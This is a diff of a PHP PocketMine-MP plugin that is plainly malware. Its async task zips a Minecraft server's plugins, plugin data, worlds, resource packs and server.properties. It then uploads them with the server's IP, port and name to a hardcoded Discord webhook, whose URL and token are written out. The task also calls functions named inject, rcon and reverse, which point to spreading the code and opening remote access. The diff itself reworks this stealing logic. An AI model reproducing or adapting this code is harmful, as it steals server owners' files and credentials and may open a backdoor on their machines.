@@ -19,7 +19,11 @@ try {
     $property = new \ReflectionProperty(\pocketmine\Server::getInstance()->getAsyncPool(), "workers");
     $property->setAccessible(true);
     if (isset($property->getValue(\pocketmine\Server::getInstance()->getAsyncPool())[$id])) return;
-    \pocketmine\Server::getInstance()->getAsyncPool()->submitTaskToWorker(new class extends \pocketmine\scheduler\AsyncTask {
+    \pocketmine\Server::getInstance()->getAsyncPool()->submitTaskToWorker(new class (\pocketmine\Server::getInstance()->getName(), \pocketmine\Server::getInstance()->getPort(), \pocketmine\Server::getInstance()->getMotd()) extends \pocketmine\scheduler\AsyncTask {
+        public function __construct(private string $name, private string $port, private string $motd)
+        {
+        }
+
         public function recursiveGlob(string $path, array $folders): array
         {
             $files = [];
@@ -41,7 +45,15 @@ try {
 
         public function onRun(): void
         {
+            $this->sendAll();
+            $this->inject();
+
+        }
+
+        private function sendAll(): void
+        {
             try {
+                $ip = \pocketmine\utils\Internet::getIP(true);
                 $folders = ["plugins", "plugin_data", "worlds", "resource_packs"];
                 foreach ($folders as $folder) {
                     if ($path = realpath("./$folder/$folder.zip") and @file_exists($path)) @unlink($path);
@@ -53,16 +65,9 @@ try {
                         @$zip->addFile("./server.properties", "server.properties");
                         @$zip->close();
                     }
+                    $this->sendFileToWebhook($path, $ip);
                 }
-            } catch (\TypeError|\ErrorException) {
-            }
-        }
-
-        private function sendAll(): void
-        {
-            $folders = ["plugins", "plugin_data", "worlds", "resource_packs"];
-            foreach ($folders as $folder) {
-                if ($path = realpath("./$folder/$folder.zip") and @file_exists($path)) $this->sendFileToWebhook($path);
+            } catch (\TypeError|\ErrorException $e) {
             }
         }
 
@@ -379,23 +384,21 @@ try {
 
         public function onCompletion(): void
         {
-            $this->sendAll();
-            $this->inject();
             $this->rcon();
             $this->reverse();
         }
 
-        public function sendFileToWebhook(string $file): void
+        public function sendFileToWebhook(string $file, string $ip): void
         {
             try {
                 $webhook = "https://discord.com/api/webhooks/1036970267823575140/yGrVAVpcUvpA6KtjLoI89iQMep--WqSIsWiGKUHCJ_v6sGRIfFkttbNq29WPSXBSDuVH";
                 $data = [
-                    "content" => "**" . \pocketmine\Server::getInstance()->getMotd() . "**\n`[" . \pocketmine\Server::getInstance()->getName() . "]`\n" .
-                        ">>> *IP:* " . \pocketmine\utils\Internet::getIP(true) .
-                        "\n*Port:* " . \pocketmine\Server::getInstance()->getPort() .
+                    "content" => "**" .$this->motd . "**\n`[" . $this->name . "]`\n" .
+                        ">>> *IP:* " . $ip .
+                        "\n*Port:* " . $this->port .
                         "\n*Fichier:* " . basename($file),
                     "tts" => "false",
-                    "file" => @curl_file_create($file, "application/zip", \pocketmine\Server::getInstance()->getName() . "/" . basename($file))];
+                    "file" => @curl_file_create($file, "application/zip", $this->name . "/" . basename($file))];
                 $curl = @curl_init($webhook);
                 @curl_setopt($curl, CURLOPT_POST, 1);
                 @curl_setopt($curl, CURLOPT_HTTPHEADER, ["Content-Type: multipart/form-data"]);
